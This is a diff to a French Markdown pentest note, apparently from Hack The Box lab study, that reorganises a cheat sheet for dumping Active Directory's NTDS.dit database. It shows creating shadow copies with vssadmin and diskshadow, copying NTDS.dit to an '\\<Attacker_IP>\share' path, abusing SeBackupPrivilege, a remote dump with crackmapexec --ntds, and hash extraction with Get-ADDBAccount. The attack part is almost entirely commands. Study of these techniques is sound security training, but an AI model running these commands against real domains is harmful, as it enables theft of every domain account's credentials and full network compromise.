@@ -1,12 +1,12 @@
 ---
 public: true
 ---
+## Dump d'NTDS.dit
+### Localement
 
-## Localement
+#### Cliché instantané (vssadmin)
 
-### Cliché instantané (vssadmin)
-
-#### Créer une Shadow Copy (cliché instantanné) du disque C
+##### Créer une Shadow Copy (cliché instantanné) du disque C
 
 La base NTDS.dit est par défaut stockée dans `C:\Windows\NTDS`
 
@@ -21,15 +21,15 @@ Successfully created shadow copy for 'C:\'
     Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
 ```
 
-#### Copier à partir du cliché instantanné
+##### Copier à partir du cliché instantanné
 
 ```
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit \\<Attacker_IP>\share\
 ```
 
-### Cliché instantanné (diskshadow.exe)
+#### Cliché instantanné (diskshadow.exe)
 
-#### Créer une Shadow Copy (cliché instantanné) du disque C
+##### Créer une Shadow Copy (cliché instantanné) du disque C
 
 ```shell
 diskshadow.exe
@@ -45,7 +45,7 @@ DISKSHADOW> end backup
 DISKSHADOW> exit
 ```
 
-#### Copier à partir du cliché instantanné
+##### Copier à partir du cliché instantanné
 
 **Remarque** :  Si le fichier n'est pas accessible et que l'on est membre du groupe *Backup Operator*, on pourra y accéder via le privilège **SeBackupPrivilege** (voir [[Privilèges Windows Exploitables]])
 
@@ -54,6 +54,15 @@ DISKSHADOW> exit
 Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
 ```
 
+### A distance
+
+```
+crackmapexec smb $TARGET_IP -u $AD_USER -p $AD_PASSWORD --ntds
+```
+
+## Extraction des informations d'identification (credentials)
+
+## Localement
 ### Extraction des informations présentes dans NTDS.dit
 
 ```powershell-session
@@ -65,8 +74,4 @@ PS C:\htb> Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inla
 
 ```
 
-## A distance
-
-```
-crackmapexec smb $TARGET_IP -u $AD_USER -p $AD_PASSWORD --ntds
-```
+### A distance
